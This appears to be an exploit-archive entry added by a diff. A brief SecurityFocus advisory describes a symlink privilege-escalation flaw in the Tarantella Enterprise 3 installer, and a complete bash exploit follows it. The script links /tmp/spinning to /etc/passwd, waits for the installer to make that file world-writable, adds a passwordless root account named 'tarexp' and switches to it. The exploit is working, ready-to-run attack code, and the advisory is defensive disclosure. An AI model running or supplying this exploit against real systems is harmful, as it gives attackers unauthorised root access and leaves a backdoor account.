@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/4115/info
+
+Tarantella Enterprise 3 contains a locally exploitable symbolic link vulnerability during it's installation procedure.
+
+This vulnerability can be exploited to elevate privileges. An attacker anticipating the install of Tarantella could create a symbolic link to any file as '/tmp/spinning'. When the installation utility is run, the file pointed to by the link will be made world writeable.
+
+The attacker may gain root privileges by overwriting a file such as '/etc/passwd'.
+
+#!/bin/bash
+#Larry W. Cashdollar  lwc@vapid.dhs.org
+#http://vapid.dhs.org
+#Tarantella Enterprise 3 symlink local root Installation exploit
+#For educational purposes only.
+#tested on Linux.  run and wait.
+
+
+echo "Creating symlink."
+
+/bin/ln -s /etc/passwd /tmp/spinning
+
+echo "Waiting for tarantella installation."
+
+while true
+do
+echo -n .
+if [ -w /etc/passwd ]
+then
+        echo "tarexp::0:0:Tarantella Exploit:/:/bin/bash" >> /etc/passwd
+        su - tarexp
+        exit
+fi
+done
